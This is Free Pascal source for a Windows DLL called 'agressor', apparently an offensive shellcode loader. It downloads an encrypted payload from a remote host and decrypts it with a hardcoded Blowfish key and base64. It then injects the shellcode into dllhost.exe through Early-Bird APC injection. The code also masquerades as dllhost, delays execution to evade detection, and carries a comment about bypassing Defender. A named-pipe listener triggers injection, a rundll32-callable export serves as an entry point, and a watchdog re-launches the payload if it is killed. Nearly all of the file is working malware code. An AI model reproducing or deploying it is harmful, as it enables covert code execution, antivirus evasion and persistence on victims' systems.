library agressor;


{$mode objfpc} {$H+}  // take a deep breath

uses
  Classes, windows, blowfish, runner,base64, shell_loader,
  strutils, SysUtils,syscalls, Core,jwawinbase;





 function QueueUserAPC(pfnAPC: PAPCFUNC; hThread: HANDLE; dwData: ULONG_PTR): DWORD; external 'Kernel32.dll' name 'QueueUserAPC';



const

 MASTER_DEC_KEY:array[0..9] of BYTE = ($7a,$75,$78,$69,$61,$6d,$68,$65,$72,$61);

 const
  Proc = 'QzpcV2luZG93c1xzeXN0ZW0zMlxEbGxIb3N0LmV4ZSAvUHJvY2Vzc2lkOns3RUFENUMxMC04QjNGLTExRTYtQUUyMi01NkI2QjY0OTk2MTF9'; //T1036

 const
  TARGET_PROC = 'dllhost.exe';


  Const
   SLEEP_VALUE = 0.1;    // change this to customize your delay procedure.

  type
    TmyLib = class
    public
     function Data_DE(forked:string; URL:Pansichar ; Local:Boolean):string;
   //  procedure birdy(Proc:string; URL:Pansichar); // make it only remote
     procedure birdy(Proc:string; URL:Pansichar); stdcall;
    end;

  type
  TByteArray = array of byte;

type
  TOnTimer = procedure(Sender: TObject) of object;


type
  TSleep_Timer = class(Tthread)

    private
    FTime: QWORD;
    FInterval: Cardinal;
    FOnTimer: TOnTimer;
    FEnabled: Boolean;
    procedure DoOnTimer;




    protected
    procedure execute(lpszCmdLine:Pansichar); virtual;
    public

    property OnTimer: TOnTimer read FOnTimer write FOnTimer;
    property Interval: Cardinal read FInterval write FInterval;
    property Enabled: Boolean read FEnabled write FEnabled;
    procedure StopTimer;
    procedure StartTimer;
    constructor Create(CreateSuspended: Boolean);
    destructor Destroy; override;

    end;


   var
TTimerEX : TSleep_Timer;
GLobal_payload : Pansichar;
TLib : TmyLib;




 procedure ReadEnvironmentVar; stdcall;
 var
  hPipe : THandle;
  BytesRead : DWORD;
  buffer : Array [0..255] of char;

 begin

   hPipe := CreateNamedPipe('\\.\pipe\moj_ML_ntsvcs',PIPE_ACCESS_INBOUND,PIPE_TYPE_BYTE OR PIPE_READMODE_BYTE,1,0,0,0,NIL);

   IF (hPipe = INVALID_HANDLE_VALUE) THEN
   BEGIN
     exit;
   end;

  if (ConnectNamedPipe(hPipe,nil) <> False) then begin

    // read from named pipe

    if (ReadFile(hPipe,@buffer,sizeof(buffer),@bytesread,nil) <> false) then
    begin
      buffer[bytesread] := #0;

      TLib.birdy('',buffer);   //execute Early-B

    end
    else
    DisconnectNamedPipe(hPipe);
    end;
     CloseHandle(hPipe);
  end;


constructor TSleep_Timer.Create(CreateSuspended: Boolean);
begin

 inherited Create(CreateSuspended);
  FInterval := 10000;
  FreeOnTerminate := True;
  FEnabled := True;

end;
destructor TSleep_Timer.Destroy;
begin
  //
  inherited Destroy;
end;



procedure TSleep_Timer.DoOnTimer;
var
server:string;
isactive : boolean;

TLib : TmyLib;
begin

  if Assigned(FOnTimer) then
    FOnTimer(Self);

    { Enable the watch dog to check if process is there

    - get the created process ID
    - check if killed or active
    - save the parameter
    - get the path of Agressor on the system
    - run the program again.

    }
   isactive := isproc(global_proc_id);

   if not isactive then
     begin
      //  MessageboxA(0,'the process has been killed','Windows Photo Viewer',MB_OK);  # enabled for debug only
      TLib.Data_DE(decodestringbase64(Proc),pchar(DecodeStringBase64(global_payload)),false);
     end;

end;

procedure TSleep_Timer.execute(lpszCmdLine:Pansichar);
var
server : string;

begin

while not Terminated do
  begin
    Sleep(1);
    if (GetTickCount64 - FTime > FInterval) and (FEnabled) then
    begin
      FTime := GetTickCount64;
      Synchronize(@DoOnTimer);
    end;
  end;
  end;

 procedure TSleep_Timer.StopTimer;
begin
  FEnabled := False;
end;

procedure TSleep_Timer.StartTimer;
begin
  FTime := GetTickCount64;
  FEnabled := True;
  if Self.Suspended then
    Start;
end;




 function Base64ToMS(const AINBase64:widestring; AOut_Stream: TMemoryStream; const A_Strict: Boolean=false):Boolean;
 var
   In_Stream: TStringStream;
   De_coder: TBase64DecodingStream;
 begin


 Result := False;
 In_Stream := TStringStream.Create(AINBase64);
   try
   //  if A_Strict then
     //  De_coder := TBase64DecodingStream.Create(In_Stream, bdmStrict)  # Defender Mortar.B Bypass =)
    // else
       De_coder := TBase64DecodingStream.Create(In_Stream,bdmMIME);
     try
       AOut_Stream.Seek(0,sofrombeginning);

       AOut_Stream.CopyFrom(De_coder,De_coder.Size);

        Result := True;
     finally
       De_coder.Free;
     end;
   finally
     In_Stream.Free;
   end;
 end;


Function DEC_Func (AINData:string; var MS: TMemoryStream):boolean;

var
  helper,str_strm: TstringStream;
  de_operator : TBLOWFishDecryptStream;
  Mem_Strm : TMemoryStream;
  TMP_data : Widestring;
  Proc_Handle : THandle;
  Key : RawByteString;
  M_File : string;

begin

  helper := TstringStream.Create;
  helper.Write(AINData[1],length(AINData) * sizeof (AINData[1]));

  key := TEncoding.UTF8.GetString(MASTER_DEC_KEY); // getting string value of array of bytes.


  str_strm := TStringStream.Create(helper.DataString);
  de_operator := TBlowFishDeCryptStream.Create(key,str_strm);     // decrypt the content of helper.Datastring

   // read the decrypted base64 decrypted data
  SetLength(TMP_data,str_strm.Size);
  de_operator.Read(TMP_data[1],str_strm.Size);
  sleep(8);

  // create final memory steam to decode base64 in the memory
  MS := TMemoryStream.Create;
  Base64ToMS(TMP_data,MS,true);


end;


procedure TmyLib.birdy(Proc:string; URL:Pansichar); stdcall;
  var
  hProcess, hThread: THandle;
  dwProcessId: DWORD;
  pAddress: PVOID;
  str_de :string;

  tmp_payload : widestring;

  str_list : Tstringlist;
  AmemStr : Tmemorystream;
  pas_fmt : widestring;

   payload : array of byte;
  i,s_size: Cardinal;
  shell_prt : string ;

   TID: DWORD;


begin



  hProcess := 0;
  hThread := 0;
  dwProcessId := 0;
  pAddress := nil;

   AmemStr := TMemoryStream.Create;
   str_list := Tstringlist.Create;

   tmp_payload :=  fetch_enc_file(DecodeStringBase64(url));



  DEC_func(tmp_payload,AMemStr);
  AmemStr.Position:=0; // align the position.

  Str_list.LoadFromStream(AmemStr);


  Pas_fmt := convertshellcode(Str_list.text);


s_size := GetShellCodeSize(Pas_fmt);
setLength(payload,s_size);

For i := 0 to s_size -1 Do begin

  shell_prt := Copy(pas_fmt,1,pos(',',pas_fmt)-1);

if i <> s_size -1 Then system.Delete(pas_fmt,1,pos(',',pas_fmt)) else

shell_prt := pas_fmt;

// copy each byte into array
payload[i] := StrToInt(shell_prt);

end;

   {*********** convert string to Tbyte Array ****************** }

  // Creating target remote process (in debugged state), thanks to MalDEVAcademy


  if not Debugable_proc(TARGET_PROC, dwProcessId,TID, hProcess, hThread) then
  begin
   Exit;
  end;

  if not InJect00r(hProcess, Payload, length(Payload), pAddress) then
  begin
    Exit;
  end;


  QueueUserAPC(TAPCPRoc(pAddress), hThread, 0);
  DebugActiveProcessStop(dwProcessId);
  CloseHandle(hProcess);
  CloseHandle(hThread);

end;

function TmyLib.Data_DE(forked:string; URL:Pansichar ; Local:Boolean):string;
var

AMemStr: TMemoryStream;
processhandle:thandle;
M_File:widestring;


begin

  // Simple Checking :)
if Local = true then
M_File := getcurrentdir+'\bin.enc'
else
M_File := fetch_enc_file(URL);  // fetch the payload from remote host + support SSL
  try

   AmemStr := TMemoryStream.Create;
   DEC_func(M_File,AMemStr);


   //

     DelayExecutionVia_NtDE(SLEEP_VALUE);


   ///

   Fork_ProC(forked,runner.TByteArray(AMemStr.memory),processhandle);


  Finally
  Amemstr.Free;

  end;
  end;


procedure ViewLogs(hwnd:HWND; hinst:HMODULE; lpszCmdLine:Pansichar; nCmdShow:Integer) stdcall;  // match the signature of rundll32
var
TLib : TmyLib;
begin

//if isEmulated = true  then
 // exit
 // else

  global_payload := lpszCmdLine;

if length(lpszCmdline) > 5 then
   begin
   TLib.Data_DE(decodestringbase64(Proc),pchar(DecodeStringBase64(lpszCmdLine)),false)
   end else
   TLib.Data_DE(decodestringbase64(Proc),pchar(DecodeStringBase64(lpszCmdLine)),True); // then it is local, so place the enc.bin file in the same path.

   (**************** TIMER STARTED ********************)

     { covert subroutine technique}

   TTimerEX :=   TSleep_Timer.Create(true);
   TTimerEX.execute(lpszCmdLine);




end;

procedure Main; stdcall;
begin
DelayExecutionVia_NtDE(SLEEP_VALUE); // put some delay here.

end;
exports ViewLogs,
Main;




//************************************//

begin
  // if isEmulated = true  then
 //   exit
 //   else
ReadEnvironmentVar;

end.

